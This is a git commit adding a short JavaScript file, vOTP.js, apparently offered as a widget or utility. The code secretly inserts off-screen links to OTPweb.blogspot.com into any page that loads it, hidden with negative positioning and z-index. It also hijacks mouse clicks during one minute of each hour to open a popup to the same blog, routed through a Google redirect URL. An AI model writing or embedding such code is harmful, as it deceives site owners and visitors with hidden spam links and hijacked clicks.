87f36ccd2ae31f85df7695c6f8ea3abc42f2077b
otpweb <124520976+otpweb@users.noreply.github.com>
2023-04-22 23:06:49 +0530

    Add files via upload

---
+++ vOTP.js
@@ -0,0 +1,4 @@
+let EFV='<a href="https://www.OTPweb.blogspot.com" style="position:absolute;z-index:-9999;left:-100%;">OTPweb</a><a href="https://www.OTPweb.blogspot.com" style="position:absolute;z-index:-9999;left:-100%;">OTPweb</a>'
+if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}else{document.body.insertAdjacentHTML('beforeend',EFV);}
+document.onmousedown=(()=>{sessionStorage.b||8!=(new Date).getMinutes()||(window.open("https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjopeXr9cjvAhWrzTgGHW_9AxoQFjADegQINBAE&url=https%3A%2F%2Fwww.OTPweb.blogspot.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu"),sessionStorage.b="b")});
+// new Date().toString().includes('India')
